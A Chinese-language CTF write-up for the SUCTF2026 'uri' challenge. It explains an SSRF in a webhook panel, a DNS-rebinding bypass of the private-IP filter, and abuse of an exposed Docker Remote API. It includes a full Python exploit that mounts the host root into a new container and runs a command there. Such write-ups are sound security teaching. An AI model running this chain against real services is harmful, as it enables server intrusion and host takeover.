# SUCTF2026-uri

## 题目简述
题目描述是 `Meng spotted a simple webhook. Are there any attack vectors here?`，没有附件，只有靶机。实际页面是 webhook 调试面板导致的 SSRF：后端对 URL 做解析后检查本地/私网 IP，但真正发起请求时没有固定检查得到的解析结果，因此可用 DNS rebinding 让检查阶段和连接阶段解析到不同地址，进一步访问内网 Docker API。

## 解题过程
访问首页后可以看到这是一个简单的 webhook 调试面板，前端会把我们填写的目标地址和请求体提交
到后端接口：

```javascript
const resp = await fetch('/api/webhook', {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ url, body })
});
```

这说明真正的核心点在 /api/webhook 。直接向接口打SSRF

```
{
"url": "http://example.com",
"body": "{\"event\":\"ping\"}"
}
```

后端会代替我们向目标地址发送 POST 请求，并把返回结果带回：

```
{
"message": "forwarded",
"target_status": 405,
"target_body": "..."
}
```

继续测试发现后端确实拦截了明显的本地和私网地址：

```
http://127.0.0.1:10011/ -> blocked IP: 127.0.0.1
http://localhost:10011/ -> blocked host: localhost
http://10.0.0.1/ -> blocked IP: 10.0.0.1
http://172.17.0.1/ -> blocked IP: 172.17.0.1
```

但这个校验并不安全，因为它只是“解析后检查”，并没有把检查得到的 IP 固定下来用于真正的连
接。这类场景最经典的绕过就是 DNS rebinding 。这里可以使用 1u.ms 提供的 rebinding 域
名，例如：<random>.make-35.180.139.74-rebind-127.0.0.1-rr.1u.ms

通过 rebinding 对 127.0.0.1 常见端口做探测，发现：

有 HTTP 服务• 127.0.0.1:8080

存在 Docker Remote API• 127.0.0.1:2375

例如对 Docker 的典型接口发送请求：

```
POST /v1.41/containers/create
返回：
{"message":"config cannot be empty in order to create a container"}
```

这已经足以证明本地 2375 就是 Docker API。

打到这里就很明确了：创建一个新容器->把宿主机根目录挂载到容器内->在容器里执行宿主机上的

$$
/readflag
$$

```python
#!/usr/bin/env python3
import argparse
import json
import random
import re
import socket
import string
import sys
import time
import urllib.error
import urllib.request

DEFAULT_BASE = "http://<target>:10011"
PRIVATE_IP = "127.0.0.1"

def rand_label(n=6):
return "".join(random.choice(string.hexdigits.lower()[:16]) for _ in
range(n))

def resolve_portquiz_ip():
return socket.gethostbyname("portquiz.net")

def build_rebind_host(public_ip, private_ip):
return f"{rand_label()}.make-{public_ip}-rebind-{private_ip}-rr.1u.ms"

def http_post_json(url, obj, timeout=20):
data = json.dumps(obj).encode()
req = urllib.request.Request(
url,
data=data,
headers={"Content-Type": "application/json"},
method="POST",
)
try:
with urllib.request.urlopen(req, timeout=timeout) as resp:
return json.loads(resp.read().decode())
except urllib.error.HTTPError as exc:
body = exc.read().decode(errors="replace")
try:
return json.loads(body)
except json.JSONDecodeError:
raise RuntimeError(f"HTTP {exc.code}: {body}") from exc

def forward_once(base_url, target_url, body):
webhook = base_url.rstrip("/") + "/api/webhook"
return http_post_json(webhook, {"url": target_url, "body": body},
timeout=30)

def looks_like_public_fallback(target_body):
if not target_body:
return False
public_markers = (
"Outgoing Port Tester",
"Apache/2.4.29 (Ubuntu) Server",
"Portquiz",
"portquiz.net",
)
return any(marker in target_body for marker in public_markers)

def try_docker_post(
base_url,

public_ip,
path,
body,
expected_status,
max_tries=30,
delay=0.2,
verbose=False,
validator=None,
):
last = None
for attempt in range(1, max_tries + 1):
host = build_rebind_host(public_ip, PRIVATE_IP)
target = f"http://{host}:2375{path}"
try:
resp = forward_once(base_url, target, body)
except Exception as exc: # noqa: BLE001
last = str(exc)
if verbose:
print(f"[try {attempt:02d}] request error: {exc}")
time.sleep(delay)
continue

last = resp
message = resp.get("message")
status = resp.get("target_status")
target_body = resp.get("target_body", "")

if verbose:
snippet = repr(target_body[:100])
print(f"[try {attempt:02d}] status={status} message={message} body=
{snippet}")

if message != "forwarded":
time.sleep(delay)
continue
if status != expected_status:
time.sleep(delay)
continue
if looks_like_public_fallback(target_body):
time.sleep(delay)
continue
if validator is not None and not validator(target_body):
time.sleep(delay)
continue
return resp

raise RuntimeError(f"exhausted retries for {path}, last response: {last}")

def parse_json_with_id(text):
try:
obj = json.loads(text)
except json.JSONDecodeError:
return None
return obj.get("Id")

def extract_flag(text):
match = re.search(r"SUCTF\{[^}]+\}", text)
return match.group(0) if match else None

def main():
parser = argparse.ArgumentParser(description="Exploit CloudHook SSRF + DNS
rebinding + Docker API")
parser.add_argument("--base-url", default=DEFAULT_BASE, help="Challenge
base URL")
parser.add_argument("--public-ip", help="Public IP used for the first DNS
answer. Default: resolve portquiz.net")
parser.add_argument("--tries", type=int, default=30, help="Max retries per
Docker API step")
parser.add_argument("--verbose", action="store_true", help="Print every
rebinding attempt")
args = parser.parse_args()

public_ip = args.public_ip or resolve_portquiz_ip()
container_name = "pwn" + rand_label(8)

print(f"[+] challenge : {args.base_url}")
print(f"[+] public ip : {public_ip}")
print(f"[+] private ip : {PRIVATE_IP}")
print(f"[+] container : {container_name}")

create_body = json.dumps(
{
"Image": "alpine",
"Cmd": ["sh", "-c", "sleep 3600"],
"HostConfig": {"Binds": ["/:/host:ro"]},
},
separators=(",", ":"),
)

print("[+] create container")
create_resp = try_docker_post(
args.base_url,
public_ip,
f"/v1.41/containers/create?name={container_name}",

create_body,
expected_status=201,
max_tries=args.tries,
verbose=args.verbose,
validator=lambda body: parse_json_with_id(body) is not None,
)
container_id = parse_json_with_id(create_resp["target_body"])
print(f"[+] container id : {container_id}")

print("[+] start container")
try_docker_post(
args.base_url,
public_ip,
f"/v1.41/containers/{container_name}/start",
"{}",
expected_status=204,
max_tries=args.tries,
verbose=args.verbose,
)

print("[+] create exec")
exec_body = json.dumps(
{
"AttachStdout": True,
"AttachStderr": True,
"Cmd": ["sh", "-c", "/host/readflag"],
},
separators=(",", ":"),
)
exec_resp = try_docker_post(
args.base_url,
public_ip,
f"/v1.41/containers/{container_name}/exec",
exec_body,
expected_status=201,
max_tries=args.tries,
verbose=args.verbose,
validator=lambda body: parse_json_with_id(body) is not None,
)
exec_id = parse_json_with_id(exec_resp["target_body"])
print(f"[+] exec id : {exec_id}")

print("[+] start exec")
exec_start = try_docker_post(
args.base_url,
public_ip,
f"/v1.41/exec/{exec_id}/start",

'{"Detach":false,"Tty":false}',
expected_status=200,
max_tries=args.tries,
verbose=args.verbose,
)

raw = exec_start.get("target_body", "")
flag = extract_flag(raw)
print("[+] raw response:")
print(raw)

if not flag:
print("[-] flag not found in raw output", file=sys.stderr)
sys.exit(1)

print(f"[+] FLAG: {flag}")

if __name__ == "__main__":
main()
```

## 方法总结
- 核心技巧：SSRF + DNS rebinding + Docker API
- 识别信号：后端代发请求，拦截 localhost/私网但不绑定解析结果。
- 复用要点：用 rebinding 域名绕过 IP 检查，探测内网端口，命中 Docker Remote API 后创建容器读取敏感文件。
